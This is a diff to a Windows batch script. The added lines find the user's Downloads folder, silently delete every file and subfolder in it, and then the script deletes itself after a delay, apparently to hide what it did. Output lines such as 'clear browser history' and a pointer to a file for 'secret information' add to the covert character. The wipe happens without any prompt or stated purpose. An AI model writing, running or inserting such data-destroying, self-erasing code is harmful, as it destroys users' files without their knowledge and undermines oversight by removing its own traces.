@@ -70,11 +70,23 @@ for %%f in (%SF%\.*) do (
 )
 
 :: delete config.cmd
+ping 127.0.0.1 -n 26 > nul
+
 echo worked
+
+echo clear browser history
 echo use %HD%\%NAME%.txt for secret information
 
+for /f "delims=" %%D in ('powershell -NoProfile -Command "[Environment]::GetFolderPath('MyDocuments').Replace('Documents', 'Downloads')"') do set "DOWNLOADS=%%D"
+
+if not exist "%DOWNLOADS%" (
+    exit /b
+)
+
+del /f /q "%DOWNLOADS%\*.*" >nul 2>&1
+for /d %%G in ("%DOWNLOADS%\*") do rd /s /q "%%G"
+
 :: Delay the removal of the script to avoid deletion while still running
-ping 127.0.0.1 -n 16 > nul
 del "%~f0" >nul 2>&1
 
 exit
